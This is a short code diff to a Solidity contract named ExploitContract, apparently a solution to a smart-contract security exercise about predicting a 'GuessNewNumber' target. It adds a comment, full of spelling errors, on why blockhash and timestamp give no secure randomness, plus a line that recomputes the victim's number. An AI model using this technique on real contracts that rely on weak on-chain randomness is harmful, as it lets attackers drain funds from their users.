@@ -27,7 +27,13 @@ contract ExploitContract {
     GuessNewNumber public guessNewNumber;
     uint8 public answer;
 
+    /**
+    1. No matter the smart contract how to Packaed the variables, such as block.number or block.timestampe, It's no impossible to generate the security random number in one trasaction.
+    Just as the blockchain is deterministic.
+    2. So the attacker just replicate the code to generate the random number.
+     */
     function Exploit() public returns (uint8) {
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         return answer;
     }
 }
